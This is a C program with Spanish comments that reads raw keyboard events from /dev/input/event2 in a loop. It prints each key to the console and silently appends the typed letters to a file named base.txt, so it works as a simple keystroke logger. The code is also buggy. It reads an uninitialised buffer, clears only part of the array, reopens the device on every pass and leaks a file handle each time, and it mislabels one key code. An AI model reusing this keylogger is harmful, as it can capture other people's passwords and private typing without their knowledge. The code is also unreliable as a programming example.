#include<stdlib.h>
#include<stdio.h>
#include<fcntl.h>
#include<string.h>

#define KEY_INPUT "/dev/input/event2"

FILE *file;

int main()
{
	
	int fd = 0;//file descriptor
	int bsize =6;
	int buffer[bsize];
	int rcode;

	fd = open(KEY_INPUT,O_RDONLY,0);//abrir file descriptor solo para leer


	while(buffer[5] != 1)//si el buffer en el espacio 1 es igual a 1 lo que indica que se presionó
	{		     //la tecla ESC el programa finaliza
				
	
		fd = open(KEY_INPUT,O_RDONLY,0);//abre archivo con permisos de lectura
		memset(&buffer,0,bsize);//limpiar memoria
		rcode = read(fd,&buffer,bsize*sizeof(int));//leer buffer
	
		printf("\n Tecla presionada \n");

		FILE *file = fopen("base.txt","a");

		if(rcode != -1)
		{

			close(fd);//cierra arhivo
			printf("\n El codigo de la letra presionada es:\n");
			printf("\n%d\n",buffer[5]);//imprime buffer
			
			switch(buffer[5])
			{
				case 2:
					printf("\nLA letra presionada es el 1\n");
					fprintf(file,"%c",'1');
				break;

				case 3:
					printf("\nLa letra presionada es el 2\n");
					fprintf(file,"%c",'2');
				break;

				case 4:
					printf("\nLa letra presionada es el 3\n");
	   				fprintf(file,"%c",'3');
				break;

				case 5:
					printf("\nLa letra presionada es el 4\n");
					fprintf(file,"%c",'4');
					
				break;

				case 6:
					printf("\nLa letra presionada es el 5\n");
					fprintf(file,"%c",'5');
				break;

				case 7:
					printf("\nLa letra presionada es el 6\n");
					fprintf(file,"%c",'6');
				break;

				case 8:
					printf("\nLa letra presionada es el 7\n");
					fprintf(file,"%c",'7');
				break;

				case 9:
					printf("\nLa letra presionada es el 8\n");
					fprintf(file,"%c",'8');
				break;

				case 10:
					printf("\nLa letra presionada es el 9\n");
					fprintf(file,"%c",'9');
				break;

				case 11:
					printf("\nLa letra presionada es el 0\n");
					fprintf(file,"%c",'0');
				break;

				case 16:
					printf("\nLa letra presionada es la Q\n");
					fprintf(file,"%c",'q');
				break;
				
				case 17:
					printf("\nLa letra presionada es la W\n");
					fprintf(file,"%c",'w');
				break;

				case 18:
					printf("\nLa letra preionada es la E\n");
					fprintf(file,"%c",'e');
				break;

				case 19:
					printf("\nLa letra presionada es la R\n");
					fprintf(file,"%c",'r');
				break;

				case 20:
					printf("\nLa letra presionada es la T\n");
					fprintf(file,"%c",'t');
				break;

				case 21:
					printf("\nLa letra presionada es la Y\n");
					fprintf(file,"%c",'y');
				break;

				case 22:
					printf("\nLa letra presionada es la U\n");
					fprintf(file,"%c",'u');
				break;

				case 23:
					printf("\nLa letra presionada es la I\n");
					fprintf(file,"%c",'i');
				break;

				case 24:
					printf("\nLa letra presionada es la O\n");
					fprintf(file,"%c",'o');
				break;

				case 25:
					printf("\nLa letra presionada es la P\n");
					fprintf(file,"%c",'p');
				break;

				case 30:
					printf("\nLa letra presionada es la A\n");
					fprintf(file,"%c",'a');
				break;

				case 31:
					printf("\nLa letra presionada es la S\n");
					fprintf(file,"%c",'s');
				break;

				case 32:
					printf("\nLa letra presionada es la D\n");
					fprintf(file,"%c",'d');
				break;

				case 33:
					printf("\nLa letra presionada es la F\n");
					fprintf(file,"%c",'f');
				break;

				case 34:
					printf("\nLa letra presionada es la G\n");
					fprintf(file,"%c",'g');

				break;

				case 35:
					printf("\nLa letra presionada es la H\n");
					fprintf(file,"%c",'h');
				break;

				case 36:
					printf("\nLa letra presionada es la J\n");
					fprintf(file,"%c",'j');
				break;

				case 37:
					printf("\nLa letra presionada es la K\n");
					fprintf(file,"%c",'k');
				break;

				case 38:
					printf("\nLa letra pesionada es la L\n");
					fprintf(file,"%c",'l');
				break;

				case 40:
					printf("\nLa letra pesionada es la Ñ\n");
					fprintf(file,"%c",'n');
				break;

				case 44:
					printf("\nLa letra presionada es la Z\n");
					fprintf(file,"%c",'z');
				break;

				case 45:
					printf("\nLa letra presionada es la X\n");
					fprintf(file,"%c",'x');
				break;

				case 46:
					printf("\nLa letra presionada es la C\n");
					fprintf(file,"%c",'c');
				break;

				case 47:
					printf("\nLa letra presionada es la V\n");
					fprintf(file,"%c",'v');
				break;

				case 48:
					printf("\nLa letra presionada es la B\n");
					fprintf(file,"%c",'b');
				break;

				case 49:
					printf("\nLa letra presionada es la N\n");
					fprintf(file,"%c",'n');
				break;

				case 50:
					printf("\nLa letra presionada es la M\n");
					fprintf(file,"%c",'m');
				break;
				
			}
		
		}

	}

	

return (0);

}
